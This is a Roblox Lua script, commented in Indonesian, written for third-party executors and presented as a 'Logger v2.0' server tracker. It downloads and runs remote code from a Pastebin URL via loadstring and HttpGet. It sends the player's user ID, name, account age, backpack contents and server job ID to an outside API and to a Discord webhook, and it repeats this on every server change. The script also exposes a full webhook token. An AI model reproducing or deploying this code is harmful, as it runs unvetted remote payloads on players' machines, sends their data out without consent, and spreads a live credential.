local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- ======= CONFIGURATION =======
local API_ENDPOINT = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF" -- Script yang akan di-execute
-- =============================

-- Variables
local player = Players.LocalPlayer
local currentJobId = game.JobId
local playerName = player.Name
local isFirstRun = true

-- Fungsi HTTP request yang kompatibel dengan berbagai executor
local function httpRequest(url, method, body, headers)
    local requestFunc = syn and syn.request or http_request or request
    if not requestFunc then return nil end
    
    local success, response = pcall(function()
        return requestFunc({
            Url = url,
            Method = method,
            Headers = headers or {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
    
    return success and response or nil
end

-- Fungsi untuk mendapatkan isi backpack
local function getBackpackContents()
    local contents = {}
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return "Backpack tidak ditemukan" end
    
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(contents, item.Name)
    end
    
    return #contents > 0 and table.concat(contents, ", ") or "Backpack kosong"
end

-- Fungsi untuk execute external script
local function executeExternalScript()
    local success, err = pcall(function()
        loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
    end)
    if not success then
        warn("Gagal execute external script:", err)
        return false
    end
    return true
end

-- Kirim data ke API
local function sendToAPI()
    local data = {
        instanceId = currentJobId,
        player = {
            userId = player.UserId,
            name = player.Name,
            accountAge = player.AccountAge
        },
        backpackContents = getBackpackContents(),
        timestamp = os.time(),
        isServerChange = not isFirstRun
    }
    
    local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
    
    if response and response.StatusCode == 200 then
        print("‚úÖ Data berhasil dikirim ke API")
        return true
    else
        warn("‚ùå Gagal mengirim data ke API:", response and response.StatusCode or "Tidak ada response")
        return false
    end
end

-- Kirim webhook ke Discord
local function sendWebhook()
    local embed = {
        username = "Logger System",
        embeds = {
            {
                title = isFirstRun and "üü¢ Script Dijalankan" or "üîÑ Server Berubah",
                description = string.format("**%s** %s\n**JobID:** `%s`", 
                    playerName, 
                    isFirstRun and "menjalankan script" or "pindah server", 
                    currentJobId),
                color = isFirstRun and 65280 or 16776960, -- Hijau untuk pertama kali, kuning untuk server change
                timestamp = DateTime.now():ToIsoDate(),
                fields = {
                    {
                        name = "üéí Isi Backpack",
                        value = getBackpackContents(),
                        inline = false
                    },
                    {
                        name = "üë§ Info Player",
                        value = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
                        inline = true
                    },
                    {
                        name = "üåê Server Status",
                        value = isFirstRun and "Join Pertama" or "Pindah Server",
                        inline = true
                    }
                },
                footer = {
                    text = "Logger v2.0 | Auto Server Tracker"
                }
            }
        }
    }
    
    local response = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
    
    if response and (response.StatusCode == 200 or response.StatusCode == 204) then
        print("‚úÖ Webhook berhasil dikirim ke Discord")
    else
        warn("‚ùå Gagal mengirim webhook:", response and response.StatusCode or "Tidak ada response")
    end
end

-- Fungsi utama yang dijalankan ketika join server
local function main()
    -- Execute external script terlebih dahulu
    local scriptSuccess = executeExternalScript()
    
    -- Jika script berhasil dijalankan, kirim data ke API dan webhook
    if scriptSuccess then
        sendToAPI()
        sendWebhook()
    else
        warn("‚ùå External script gagal dijalankan, proses pengiriman data dibatalkan")
    end
    
    isFirstRun = false
end

-- Deteksi perubahan server
local function trackServerChanges()
    while true do
        local newJobId = game.JobId
        if newJobId ~= currentJobId then
            print("‚ö†Ô∏è Deteksi perubahan server:", currentJobId, "->", newJobId)
            currentJobId = newJobId
            main() -- Jalankan lagi ketika pindah server
        end
        wait(5) -- Check setiap 5 detik
    end
end

-- Jalankan dengan error handling
local success, err = pcall(function()
    main() -- Jalankan pertama kali
    trackServerChanges() -- Mulai tracking perubahan server
end)

if not success then
    warn("‚ùå Error fatal pada logger:", err)
end
